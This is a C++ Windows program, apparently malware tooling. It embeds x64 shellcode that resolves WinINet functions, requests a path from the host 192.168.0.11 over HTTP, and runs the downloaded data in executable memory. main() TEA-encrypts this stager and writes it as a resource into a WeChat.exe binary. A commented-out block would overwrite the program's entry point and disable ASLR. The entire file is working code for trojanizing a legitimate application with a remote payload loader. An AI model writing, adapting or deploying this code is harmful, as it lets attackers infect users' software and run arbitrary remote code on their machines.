#include<iostream>
#include<string>
#include<windows.h>
#pragma warning(disable : 4996)

#pragma comment(linker, "/SECTION:.data,ERW")
#pragma comment(linker, "/SECTION:.rdata,ERW")

using namespace std;

unsigned char buf[1612] = {
	0x40,0x55,0x53,0x56,0x57,0x41,0x54,0x41,0x56,0x41,0x57,0x48,0x8d,0x6c,0x24,0xb0,0x48,0x81,0xec,0x50,0x1,0,0,0xc7,0x44,0x24,0x40,0x45,0x78,0x69,0x74,0xc7,
	0x44,0x24,0x44,0x50,0x72,0x6f,0x63,0xc7,0x44,0x24,0x48,0x65,0x73,0x73,0,0xc7,0x44,0x24,0x60,0x56,0x69,0x72,0x74,0xc7,0x44,0x24,0x64,0x75,0x61,0x6c,0x41,0xc7,
	0x44,0x24,0x68,0x6c,0x6c,0x6f,0x63,0xc6,0x44,0x24,0x6c,0,0xc7,0x44,0x24,0x70,0x4c,0x6f,0x61,0x64,0xc7,0x44,0x24,0x74,0x4c,0x69,0x62,0x72,0xc7,0x44,0x24,0x78,
	0x61,0x72,0x79,0x41,0xc6,0x44,0x24,0x7c,0,0xc7,0x45,0xa0,0x47,0x65,0x74,0x50,0xc7,0x45,0xa4,0x72,0x6f,0x63,0x41,0xc7,0x45,0xa8,0x64,0x64,0x72,0x65,0x66,0xc7,
	0x45,0xac,0x73,0x73,0xc6,0x45,0xae,0,0xc7,0x45,0x90,0x49,0x6e,0x74,0x65,0xc7,0x45,0x94,0x72,0x6e,0x65,0x74,0xc7,0x45,0x98,0x4f,0x70,0x65,0x6e,0x66,0xc7,0x45,
	0x9c,0x41,0,0xc7,0x44,0x24,0x50,0x57,0x69,0x6e,0x69,0xc7,0x44,0x24,0x54,0x6e,0x65,0x74,0x2e,0xc7,0x44,0x24,0x58,0x64,0x6c,0x6c,0,0xc7,0x45,0x80,0x31,0x39,
	0x32,0x2e,0xc7,0x45,0x84,0x31,0x36,0x38,0x2e,0xc7,0x45,0x88,0x30,0x2e,0x31,0x31,0xc6,0x45,0x8c,0,0xc6,0x45,0xb0,0x49,0xc6,0x45,0xb1,0x6e,0xc6,0x45,0xb2,0x74,
	0xc6,0x45,0xb3,0x65,0xc6,0x45,0xb4,0x72,0xc6,0x45,0xb5,0x6e,0xc6,0x45,0xb6,0x65,0xc6,0x45,0xb7,0x74,0xc6,0x45,0xb8,0x43,0xc6,0x45,0xb9,0x6f,0xc6,0x45,0xba,0x6e,
	0xc6,0x45,0xbb,0x6e,0xc6,0x45,0xbc,0x65,0xc6,0x45,0xbd,0x63,0xc6,0x45,0xbe,0x74,0xc6,0x45,0xbf,0x41,0xc6,0x45,0xc0,0,0xc6,0x45,0xc8,0x48,0xc6,0x45,0xc9,0x74,
	0xc6,0x45,0xca,0x74,0xc6,0x45,0xcb,0x70,0xc6,0x45,0xcc,0x4f,0xc6,0x45,0xcd,0x70,0xc6,0x45,0xce,0x65,0xc6,0x45,0xcf,0x6e,0xc6,0x45,0xd0,0x52,0xc6,0x45,0xd1,0x65,
	0xc6,0x45,0xd2,0x71,0xc6,0x45,0xd3,0x75,0xc6,0x45,0xd4,0x65,0xc6,0x45,0xd5,0x73,0xc6,0x45,0xd6,0x74,0xc6,0x45,0xd7,0x41,0xc6,0x45,0xd8,0,0xc6,0x45,0xe0,0x48,
	0xc6,0x45,0xe1,0x74,0xc6,0x45,0xe2,0x74,0xc6,0x45,0xe3,0x70,0xc6,0x45,0xe4,0x53,0xc6,0x45,0xe5,0x65,0xc6,0x45,0xe6,0x6e,0xc6,0x45,0xe7,0x64,0xc6,0x45,0xe8,0x52,
	0xc6,0x45,0xe9,0x65,0xc6,0x45,0xea,0x71,0xc6,0x45,0xeb,0x75,0xc6,0x45,0xec,0x65,0xc6,0x45,0xed,0x73,0xc6,0x45,0xee,0x74,0xc6,0x45,0xef,0x41,0xc6,0x45,0xf0,0,
	0xc6,0x45,0x10,0x49,0xc6,0x45,0x11,0x6e,0x4c,0x89,0xac,0x24,0x48,0x1,0,0,0xc6,0x45,0x12,0x74,0xc6,0x45,0x13,0x65,0xc6,0x45,0x14,0x72,0xc6,0x45,0x15,0x6e,
	0xc6,0x45,0x16,0x65,0xc6,0x45,0x17,0x74,0xc6,0x45,0x18,0x43,0xc6,0x45,0x19,0x6c,0xc6,0x45,0x1a,0x6f,0xc6,0x45,0x1b,0x73,0xc6,0x45,0x1c,0x65,0xc6,0x45,0x1d,0x48,
	0xc6,0x45,0x1e,0x61,0xc6,0x45,0x1f,0x6e,0xc6,0x45,0x20,0x64,0xc6,0x45,0x21,0x6c,0xc6,0x45,0x22,0x65,0xc6,0x45,0x23,0,0xc6,0x45,0xf8,0x49,0xc6,0x45,0xf9,0x6e,
	0xc6,0x45,0xfa,0x74,0xc6,0x45,0xfb,0x65,0xc6,0x45,0xfc,0x72,0xc6,0x45,0xfd,0x6e,0xc6,0x45,0xfe,0x65,0xc6,0x45,0xff,0x74,0xc6,0x45,0,0x52,0xc6,0x45,0x1,0x65,
	0xc6,0x45,0x2,0x61,0xc6,0x45,0x3,0x64,0xc6,0x45,0x4,0x46,0xc6,0x45,0x5,0x69,0xc6,0x45,0x6,0x6c,0xc6,0x45,0x7,0x65,0xc6,0x45,0x8,0,0xe8,0xef,0x3,0,
	0,0x45,0x33,0xe4,0x4c,0x8b,0xc8,0x45,0x8b,0xc4,0x8b,0x48,0x3c,0x8b,0x94,0x1,0x88,0,0,0,0x8b,0x5c,0x2,0x1c,0x44,0x8b,0x54,0x2,0x20,0x48,0x3,0xd8,
	0x8b,0x7c,0x2,0x24,0x4c,0x3,0xd0,0x44,0x8b,0x5c,0x2,0x18,0x48,0x3,0xf8,0x4d,0x85,0xdb,0x74,0x47,0xf,0x1f,0x40,0,0xf,0x1f,0x84,0,0,0,0,0,
	0x43,0x8b,0x4,0x82,0x48,0x8d,0x54,0x24,0x40,0x49,0x3,0xc1,0xf,0xb6,0x8,0x84,0xc9,0x74,0x12,0x3a,0xa,0x75,0xe,0xf,0xb6,0x48,0x1,0x48,0xff,0xc0,0x48,0xff,
	0xc2,0x84,0xc9,0x75,0xee,0xf,0xb6,0x12,0xf,0xb6,0x8,0x3b,0xca,0xf,0x84,0x35,0x3,0,0,0x49,0xff,0xc0,0x4d,0x3b,0xc3,0x72,0xc5,0x4d,0x8b,0xfc,0xe8,0x6d,
	0x3,0,0,0x4c,0x8b,0xc8,0x4d,0x8b,0xc4,0x8b,0x48,0x3c,0x8b,0x94,0x1,0x88,0,0,0,0x8b,0x5c,0x2,0x1c,0x44,0x8b,0x54,0x2,0x20,0x48,0x3,0xd8,0x8b,
	0x7c,0x2,0x24,0x4c,0x3,0xd0,0x44,0x8b,0x5c,0x2,0x18,0x48,0x3,0xf8,0x4d,0x85,0xdb,0x74,0x48,0xf,0x1f,0x40,0,0x66,0xf,0x1f,0x84,0,0,0,0,0,
	0x43,0x8b,0x4,0x82,0x48,0x8d,0x54,0x24,0x60,0x49,0x3,0xc1,0xf,0xb6,0x8,0x84,0xc9,0x74,0x12,0x3a,0xa,0x75,0xe,0xf,0xb6,0x48,0x1,0x48,0xff,0xc0,0x48,0xff,
	0xc2,0x84,0xc9,0x75,0xee,0xf,0xb6,0xa,0xf,0xb6,0,0x3b,0xc1,0xf,0x84,0xc6,0x2,0,0,0x49,0xff,0xc0,0x4d,0x3b,0xc3,0x72,0xc5,0x4c,0x89,0xa5,0xa8,0,
	0,0,0xe8,0xe9,0x2,0,0,0x4c,0x8b,0xc8,0x4d,0x8b,0xc4,0x8b,0x48,0x3c,0x8b,0x94,0x1,0x88,0,0,0,0x8b,0x5c,0x2,0x1c,0x44,0x8b,0x54,0x2,0x20,
	0x48,0x3,0xd8,0x8b,0x7c,0x2,0x24,0x4c,0x3,0xd0,0x44,0x8b,0x5c,0x2,0x18,0x48,0x3,0xf8,0x4d,0x85,0xdb,0x74,0x44,0x66,0xf,0x1f,0x84,0,0,0,0,0,
	0x43,0x8b,0x4,0x82,0x48,0x8d,0x54,0x24,0x70,0x49,0x3,0xc1,0xf,0xb6,0x8,0x84,0xc9,0x74,0x12,0x3a,0xa,0x75,0xe,0xf,0xb6,0x48,0x1,0x48,0xff,0xc0,0x48,0xff,
	0xc2,0x84,0xc9,0x75,0xee,0xf,0xb6,0xa,0xf,0xb6,0,0x3b,0xc1,0xf,0x84,0x5d,0x2,0,0,0x49,0xff,0xc0,0x4d,0x3b,0xc3,0x72,0xc5,0x49,0x8b,0xdc,0xe8,0x6d,
	0x2,0,0,0x4c,0x8b,0xc8,0x4d,0x8b,0xc4,0x8b,0x48,0x3c,0x8b,0x94,0x1,0x88,0,0,0,0x8b,0x7c,0x2,0x1c,0x44,0x8b,0x54,0x2,0x20,0x48,0x3,0xf8,0x8b,
	0x74,0x2,0x24,0x4c,0x3,0xd0,0x44,0x8b,0x5c,0x2,0x18,0x48,0x3,0xf0,0x4d,0x85,0xdb,0x74,0x47,0xf,0x1f,0x40,0,0x66,0xf,0x1f,0x84,0,0,0,0,0,
	0x43,0x8b,0x4,0x82,0x48,0x8d,0x55,0xa0,0x49,0x3,0xc1,0xf,0xb6,0x8,0x84,0xc9,0x74,0x12,0x3a,0xa,0x75,0xe,0xf,0xb6,0x48,0x1,0x48,0xff,0xc0,0x48,0xff,0xc2,
	0x84,0xc9,0x75,0xee,0xf,0xb6,0xa,0xf,0xb6,0,0x3b,0xc1,0xf,0x84,0xee,0x1,0,0,0x49,0xff,0xc0,0x4d,0x3b,0xc3,0x72,0xc6,0x49,0x8b,0xf4,0x48,0x8d,0x4c,
	0x24,0x50,0xff,0xd3,0x48,0x8d,0x55,0x90,0x48,0x8b,0xc8,0x48,0x8b,0xd8,0xff,0xd6,0x48,0x8d,0x55,0xb0,0x48,0x8b,0xcb,0x48,0x8b,0xf8,0xff,0xd6,0x48,0x8d,0x55,0xc8,
	0x48,0x8b,0xcb,0x4c,0x8b,0xe8,0xff,0xd6,0x48,0x8d,0x55,0xe0,0x48,0x89,0x45,0x28,0x48,0x8b,0xcb,0xff,0xd6,0x48,0x8d,0x55,0x10,0x48,0x89,0x45,0x30,0x48,0x8b,0xcb,
	0xff,0xd6,0x48,0x8d,0x55,0xf8,0x48,0x8b,0xcb,0x4c,0x8b,0xf0,0xff,0xd6,0x45,0x33,0xc9,0x48,0x89,0x45,0x38,0x45,0x33,0xc0,0x44,0x89,0x64,0x24,0x20,0xba,0x1,0,
	0,0,0x33,0xc9,0xff,0xd7,0x4c,0x8b,0xe0,0x48,0x85,0xc0,0x75,0x8,0xb9,0x1,0,0,0,0x41,0xff,0xd7,0x33,0xff,0x48,0x8d,0x55,0x80,0x48,0x89,0x7c,0x24,
	0x38,0x41,0xb8,0x50,0,0,0,0x89,0x7c,0x24,0x30,0x45,0x33,0xc9,0xc7,0x44,0x24,0x28,0x3,0,0,0,0x49,0x8b,0xcc,0x48,0x89,0x7c,0x24,0x20,0x41,0xff,
	0xd5,0x4c,0x8b,0xac,0x24,0x48,0x1,0,0,0x48,0x8b,0xf0,0x48,0x85,0xc0,0x75,0x8,0xb9,0x1,0,0,0,0x41,0xff,0xd7,0x48,0x89,0x7c,0x24,0x38,0x4c,0x8d,
	0x85,0xa0,0,0,0,0xc7,0x44,0x24,0x30,0,0,0x40,0,0x48,0x8d,0x95,0x90,0,0,0,0x48,0x89,0x7c,0x24,0x28,0x45,0x33,0xc9,0x48,0x8b,0xce,0x48,
	0x89,0x7c,0x24,0x20,0xc7,0x85,0x90,0,0,0,0x47,0x45,0x54,0,0xc7,0x85,0xa0,0,0,0,0x2f,0x53,0x52,0x63,0x66,0xc7,0x85,0xa4,0,0,0,0x55,
	0,0xff,0x55,0x28,0x48,0x8b,0xd8,0x48,0x85,0xc0,0x75,0x8,0xb9,0x1,0,0,0,0x41,0xff,0xd7,0x45,0x33,0xc9,0x89,0x7c,0x24,0x20,0x45,0x33,0xc0,0x33,0xd2,
	0x48,0x8b,0xcb,0xff,0x55,0x30,0x85,0xc0,0x75,0x8,0xb9,0x1,0,0,0,0x41,0xff,0xd7,0xba,0,0,0xa0,0,0x33,0xc9,0x41,0xb9,0x40,0,0,0,0x41,
	0xb8,0,0x10,0,0,0xff,0x95,0xa8,0,0,0,0x48,0x8b,0xf8,0x48,0x85,0xc0,0x75,0x8,0xb9,0x1,0,0,0,0x41,0xff,0xd7,0x4c,0x8d,0x8d,0x98,0,
	0,0,0x41,0xb8,0,0,0xa0,0,0x48,0x8b,0xd7,0x48,0x8b,0xcb,0xff,0x55,0x38,0x83,0xbd,0x98,0,0,0,0,0x75,0x8,0xb9,0x1,0,0,0,0x41,
	0xff,0xd7,0x48,0x8b,0xcb,0x41,0xff,0xd6,0x48,0x8b,0xce,0x41,0xff,0xd6,0x49,0x8b,0xcc,0x41,0xff,0xd6,0xff,0xd7,0x48,0x81,0xc4,0x50,0x1,0,0,0x41,0x5f,0x41,
	0x5e,0x41,0x5c,0x5f,0x5e,0x5b,0x5d,0xc3,0x42,0xf,0xb7,0x4,0x47,0x44,0x8b,0x3c,0x83,0x4d,0x3,0xf9,0xe9,0xc5,0xfc,0xff,0xff,0x42,0xf,0xb7,0x4,0x47,0x8b,0x34,
	0x83,0x49,0x3,0xf1,0x48,0x89,0xb5,0xa8,0,0,0,0xe9,0x32,0xfd,0xff,0xff,0x42,0xf,0xb7,0x4,0x47,0x8b,0x1c,0x83,0x49,0x3,0xd9,0xe9,0x9e,0xfd,0xff,0xff,
	0x42,0xf,0xb7,0x4,0x46,0x8b,0x34,0x87,0x49,0x3,0xf1,0xe9,0xd,0xfe,0xff,0xff,0x65,0x48,0x8b,0x4,0x25,0x60,0,0,0,0x48,0x8b,0x40,0x18,0x48,0x8b,0x40,
	0x30,0x48,0x8b,0,0x48,0x8b,0,0x48,0x8b,0x40,0x10,0xc3,
};
static DWORD rva2raw(DWORD rva, PIMAGE_NT_HEADERS32 nt) {
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
	for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sections) {
		if (sections->VirtualAddress >= rva) {
			--sections;
			break;
		}
	}
	return sections->PointerToRawData + rva - sections->VirtualAddress;
}

static uint64_t tea_encrypt(uint64_t v, uint32_t* k) {
	uint32_t v0 = ((uint32_t*)&v)[0], v1 = ((uint32_t*)&v)[1], sum = 0;
	uint32_t delta = 0x9e3779b9;
	uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
	for (int i = 0; i < 32; i++) {
		sum += delta;
		v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
		v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
	}

	uint64_t result = 0;
	((uint32_t*)&result)[0] = v0;
	((uint32_t*)&result)[1] = v1;
	return result;
}

static void mytea(uint8_t* data, size_t size, uint8_t key[16]) {
	uint64_t counter = *(uint64_t*)key;

	for (size_t offset = 0; offset < size; offset += 8, ++counter) {
		size_t remaining = size - offset;

		if (remaining >= 8) {
			(*(uint64_t*)(data + offset)) ^= tea_encrypt(counter, (uint32_t*)key);
		}
		else {
			uint8_t temp[8]{};
			for (int i = 0; i < remaining; ++i)temp[i] = (data + offset)[i];
			(*(uint64_t*)temp) ^= tea_encrypt(counter, (uint32_t*)key);
			for (int i = 0; i < remaining; ++i)(data + offset)[i] = temp[i];
		}
	}
}

struct payload_header
{
	uint8_t key[16];
	uint32_t size;
};

int main() {
	HANDLE hUpd = BeginUpdateResourceA("C:\\Users\\ADMIN\\Desktop\\WeChat.exe", 0);
	if (hUpd == NULL) {
		printf("无法打开文件");
		return 1;
	}

	uint8_t* new_data = new uint8_t[sizeof buf + sizeof payload_header];
	payload_header* header = (payload_header*)new_data;
	for (int i = 0; i < 16; i++)header->key[i] = rand();
	header->size = sizeof buf;

	mytea(buf, sizeof buf, header->key);
	memcpy(new_data + sizeof payload_header, buf, sizeof buf);
	
	if (!UpdateResourceA(hUpd, MAKEINTRESOURCEA(RT_DIALOG), "104", MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), new_data, sizeof buf + sizeof payload_header)) {
		printf("无法更新资源");
		return 1;
	}
	if (!EndUpdateResourceA(hUpd, 0)) {
		printf("无法关闭资源");
		return 1;
	}
	delete[]new_data;
	
	
	/*
	HANDLE hFile = CreateFileA("C:\\Users\\ADMIN\\Desktop\\WeChat.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("无法打开文件");
		return 1;
	}

	DWORD file_size = GetFileSize(hFile, 0);
	char* file_buffer = new char[file_size];
	DWORD dwRead;
	if (!ReadFile(hFile, file_buffer, file_size, &dwRead, 0)) {
		printf("无法读取文件");
		return 1;
	}

	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_buffer;
	PIMAGE_NT_HEADERS32 nt_header_32 = (PIMAGE_NT_HEADERS32)(file_buffer + dos_header->e_lfanew);
	PIMAGE_NT_HEADERS64 nt_header_64 = (PIMAGE_NT_HEADERS64)(file_buffer + dos_header->e_lfanew);
	bool is_x64 = false;
	if (nt_header_32->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
		printf("架构：64位\n");

		//关闭ASLR，不然加载器会被重定向破环掉
		if (nt_header_64->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
			nt_header_64->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		}

		//用加载器覆盖入口
		DWORD ep = rva2raw(nt_header_64->OptionalHeader.AddressOfEntryPoint, nt_header_32);
		printf("入口RVA：0x%x 文件偏移：0x%x\n", nt_header_64->OptionalHeader.AddressOfEntryPoint, ep);

		memcpy(file_buffer + ep, shellcode, sizeof shellcode);
		SetFilePointer(hFile,0,0,0);
		DWORD dwwrite;
		WriteFile(hFile,file_buffer,file_size,&dwwrite,0);
		CloseHandle(hFile);
	}
	else if (nt_header_32->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
		printf("架构：32位\n");
		if (nt_header_32->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
			nt_header_32->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		}



	}
	else {
		printf("不支持的架构");
		return 1;
	}
	*/
	
}
